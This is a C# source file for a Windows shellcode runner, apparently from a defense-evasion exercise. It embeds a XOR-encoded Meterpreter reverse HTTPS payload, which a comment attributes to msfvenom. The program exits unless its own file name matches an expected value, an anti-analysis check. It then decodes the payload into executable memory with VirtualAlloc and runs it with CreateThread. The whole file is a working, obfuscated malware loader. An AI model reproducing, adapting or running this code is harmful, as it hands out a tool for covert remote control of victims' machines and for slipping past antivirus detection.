﻿//tool-encoder XOR with key 169 C# Win32 API shellcode runner executable with environment variable check (filename)

using System;
using System.IO;
using System.Runtime.InteropServices;

namespace DE_6
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            //environment variable check (filename)
            string filename = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
            Console.WriteLine($"Execution file name: {filename}");
            if (filename != "DE-6.exe")
            {
                return;
            }
            //key 169 XORed
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[737] {
            0x55, 0xe1, 0x2a, 0x4d, 0x59, 0x41, 0x65, 0xa9, 0xa9, 0xa9, 0xe8, 0xf8, 0xe8, 0xf9, 0xfb,
            0xe1, 0x98, 0x7b, 0xcc, 0xe1, 0x22, 0xfb, 0xc9, 0xe1, 0x22, 0xfb, 0xb1, 0xf8, 0xe1, 0x22,
            0xfb, 0x89, 0xff, 0xe4, 0x98, 0x60, 0xe1, 0xa6, 0x1e, 0xe3, 0xe3, 0xe1, 0x22, 0xdb, 0xf9,
            0xe1, 0x98, 0x69, 0x05, 0x95, 0xc8, 0xd5, 0xab, 0x85, 0x89, 0xe8, 0x68, 0x60, 0xa4, 0xe8,
            0xa8, 0x68, 0x4b, 0x44, 0xfb, 0xe1, 0x22, 0xfb, 0x89, 0x22, 0xeb, 0x95, 0xe1, 0xa8, 0x79,
            0xcf, 0x28, 0xd1, 0xb1, 0xa2, 0xab, 0xe8, 0xf8, 0xa6, 0x2c, 0xdb, 0xa9, 0xa9, 0xa9, 0x22,
            0x29, 0x21, 0xa9, 0xa9, 0xa9, 0xe1, 0x2c, 0x69, 0xdd, 0xce, 0xe1, 0xa8, 0x79, 0xed, 0x22,
            0xe9, 0x89, 0xe0, 0xa8, 0x79, 0x22, 0xe1, 0xb1, 0xf9, 0x4a, 0xff, 0xe1, 0x56, 0x60, 0xe8,
            0x22, 0x9d, 0x21, 0xe1, 0xa8, 0x7f, 0xe4, 0x98, 0x60, 0xe1, 0x98, 0x69, 0x05, 0xe8, 0x68,
            0x60, 0xa4, 0xe8, 0xa8, 0x68, 0x91, 0x49, 0xdc, 0x58, 0xe5, 0xaa, 0xe5, 0x8d, 0xa1, 0xec,
            0x90, 0x78, 0xdc, 0x71, 0xf1, 0xed, 0x22, 0xe9, 0x8d, 0xe0, 0xa8, 0x79, 0xcf, 0xe8, 0x22,
            0xa5, 0xe1, 0xed, 0x22, 0xe9, 0xb5, 0xe0, 0xa8, 0x79, 0xe8, 0x22, 0xad, 0x21, 0xe1, 0xa8,
            0x79, 0xe8, 0xf1, 0xe8, 0xf1, 0xf7, 0xf0, 0xf3, 0xe8, 0xf1, 0xe8, 0xf0, 0xe8, 0xf3, 0xe1,
            0x2a, 0x45, 0x89, 0xe8, 0xfb, 0x56, 0x49, 0xf1, 0xe8, 0xf0, 0xf3, 0xe1, 0x22, 0xbb, 0x40,
            0xe2, 0x56, 0x56, 0x56, 0xf4, 0xe1, 0x98, 0x72, 0xfa, 0xe0, 0x17, 0xde, 0xc0, 0xc7, 0xc0,
            0xc7, 0xcc, 0xdd, 0xa9, 0xe8, 0xff, 0xe1, 0x20, 0x48, 0xe0, 0x6e, 0x6b, 0xe5, 0xde, 0x8f,
            0xae, 0x56, 0x7c, 0xfa, 0xfa, 0xe1, 0x20, 0x48, 0xfa, 0xf3, 0xe4, 0x98, 0x69, 0xe4, 0x98,
            0x60, 0xfa, 0xfa, 0xe0, 0x13, 0x93, 0xff, 0xd0, 0x0e, 0xa9, 0xa9, 0xa9, 0xa9, 0x56, 0x7c,
            0x41, 0xa3, 0xa9, 0xa9, 0xa9, 0x98, 0x9b, 0x9e, 0x87, 0x99, 0x87, 0x99, 0x87, 0x98, 0xa9,
            0xf3, 0xe1, 0x20, 0x68, 0xe0, 0x6e, 0x69, 0x12, 0xa8, 0xa9, 0xa9, 0xe4, 0x98, 0x60, 0xfa,
            0xfa, 0xc3, 0xaa, 0xfa, 0xe0, 0x13, 0xfe, 0x20, 0x36, 0x6f, 0xa9, 0xa9, 0xa9, 0xa9, 0x56,
            0x7c, 0x41, 0x12, 0xa9, 0xa9, 0xa9, 0x86, 0xf0, 0x9f, 0xca, 0xc2, 0xec, 0xe5, 0xdf, 0x90,
            0xc7, 0xc8, 0xe8, 0xfb, 0xcb, 0xfb, 0xeb, 0xdf, 0xcd, 0x98, 0xc5, 0x9e, 0x99, 0xce, 0x9b,
            0xf1, 0xda, 0x91, 0x98, 0xca, 0xe7, 0x9c, 0xc2, 0xfa, 0xee, 0xc1, 0xc0, 0xe4, 0xdb, 0xe8,
            0xeb, 0xc2, 0xe1, 0xed, 0xc7, 0xdb, 0xfa, 0xc2, 0xfa, 0xe1, 0xe4, 0xf3, 0xdf, 0xdd, 0xff,
            0xdc, 0xfa, 0xf6, 0xcd, 0xe6, 0xf8, 0xc4, 0xfd, 0xe2, 0xf0, 0x9d, 0xd9, 0xfe, 0xef, 0xf6,
            0xfc, 0xf6, 0xe0, 0xf0, 0xf1, 0xc0, 0xed, 0xfd, 0xc0, 0xcd, 0xda, 0xc3, 0xea, 0xed, 0xe2,
            0xdd, 0xdc, 0xce, 0xff, 0xff, 0x84, 0xde, 0xec, 0x91, 0xf0, 0xf0, 0xcd, 0xfd, 0xc7, 0xfa,
            0xda, 0x9f, 0x91, 0xc6, 0xe2, 0xe7, 0x98, 0xd0, 0xcd, 0x84, 0x9c, 0xf1, 0xeb, 0xec, 0xe7,
            0x9f, 0xee, 0xe1, 0xdb, 0xe8, 0xf0, 0xde, 0xcd, 0xe1, 0xf0, 0xe2, 0xf0, 0xd0, 0x91, 0xf1,
            0x9e, 0xc5, 0xd9, 0xcd, 0xc2, 0xce, 0xe7, 0xdb, 0x9b, 0xdb, 0xd1, 0xd3, 0x84, 0xeb, 0xfa,
            0xea, 0xe6, 0xf3, 0x9c, 0xe7, 0xea, 0xd0, 0xde, 0xeb, 0xff, 0xc7, 0xf1, 0xce, 0xf6, 0xf9,
            0xfe, 0xed, 0xca, 0xda, 0xeb, 0xfe, 0xfa, 0xfb, 0xef, 0xf9, 0xf6, 0xc5, 0xdc, 0xcf, 0x9e,
            0xda, 0x9f, 0x90, 0xd8, 0xc5, 0xfc, 0xf6, 0xfb, 0xe4, 0xd3, 0x84, 0x9b, 0xa9, 0xe1, 0x20,
            0x68, 0xfa, 0xf3, 0xe8, 0xf1, 0xe4, 0x98, 0x60, 0xfa, 0xe1, 0x11, 0xa9, 0x9b, 0x01, 0x2d,
            0xa9, 0xa9, 0xa9, 0xa9, 0xf9, 0xfa, 0xfa, 0xe0, 0x6e, 0x6b, 0x42, 0xfc, 0x87, 0x92, 0x56,
            0x7c, 0xe1, 0x20, 0x6f, 0xc3, 0xa3, 0xf6, 0xe1, 0x20, 0x58, 0xc3, 0xb6, 0xf3, 0xfb, 0xc1,
            0x29, 0x9a, 0xa9, 0xa9, 0xe0, 0x20, 0x49, 0xc3, 0xad, 0xe8, 0xf0, 0xe0, 0x13, 0xdc, 0xef,
            0x37, 0x2f, 0xa9, 0xa9, 0xa9, 0xa9, 0x56, 0x7c, 0xe4, 0x98, 0x69, 0xfa, 0xf3, 0xe1, 0x20,
            0x58, 0xe4, 0x98, 0x60, 0xe4, 0x98, 0x60, 0xfa, 0xfa, 0xe0, 0x6e, 0x6b, 0x84, 0xaf, 0xb1,
            0xd2, 0x56, 0x7c, 0x2c, 0x69, 0xdc, 0xb6, 0xe1, 0x6e, 0x68, 0x21, 0xba, 0xa9, 0xa9, 0xe0,
            0x13, 0xed, 0x59, 0x9c, 0x49, 0xa9, 0xa9, 0xa9, 0xa9, 0x56, 0x7c, 0xe1, 0x56, 0x66, 0xdd,
            0xab, 0x42, 0x03, 0x41, 0xfc, 0xa9, 0xa9, 0xa9, 0xfa, 0xf0, 0xc3, 0xe9, 0xf3, 0xe0, 0x20,
            0x78, 0x68, 0x4b, 0xb9, 0xe0, 0x6e, 0x69, 0xa9, 0xb9, 0xa9, 0xa9, 0xe0, 0x13, 0xf1, 0x0d,
            0xfa, 0x4c, 0xa9, 0xa9, 0xa9, 0xa9, 0x56, 0x7c, 0xe1, 0x3a, 0xfa, 0xfa, 0xe1, 0x20, 0x4e,
            0xe1, 0x20, 0x58, 0xe1, 0x20, 0x73, 0xe0, 0x6e, 0x69, 0xa9, 0x89, 0xa9, 0xa9, 0xe0, 0x20,
            0x50, 0xe0, 0x13, 0xbb, 0x3f, 0x20, 0x4b, 0xa9, 0xa9, 0xa9, 0xa9, 0x56, 0x7c, 0xe1, 0x2a,
            0x6d, 0x89, 0x2c, 0x69, 0xdd, 0x1b, 0xcf, 0x22, 0xae, 0xe1, 0xa8, 0x6a, 0x2c, 0x69, 0xdc,
            0x7b, 0xf1, 0x6a, 0xf1, 0xc3, 0xa9, 0xf0, 0x12, 0x49, 0xb4, 0x83, 0xa3, 0xe8, 0x20, 0x73,
            0x56, 0x7c
            };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            //unxor with key 169
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 169);
            }

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}